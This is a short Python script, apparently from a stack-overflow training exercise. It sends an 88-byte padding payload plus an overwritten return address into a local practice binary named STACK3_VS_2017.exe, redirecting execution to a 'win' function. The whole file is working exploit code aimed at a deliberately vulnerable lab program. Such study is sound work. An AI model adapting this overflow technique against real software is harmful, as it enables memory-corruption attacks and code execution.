import sys
from subprocess import Popen, PIPE
#target the address of win instead of the condition to be checked to avoid bad characters
payload = b"A" *88 + b"\x84\x10\x40\x00"

io = Popen(r"C:\code\exploit\part1-stackabos\STACKS\STACK3_VS_2017.exe", stdin=PIPE)
io.communicate(payload)
io.wait()
input()
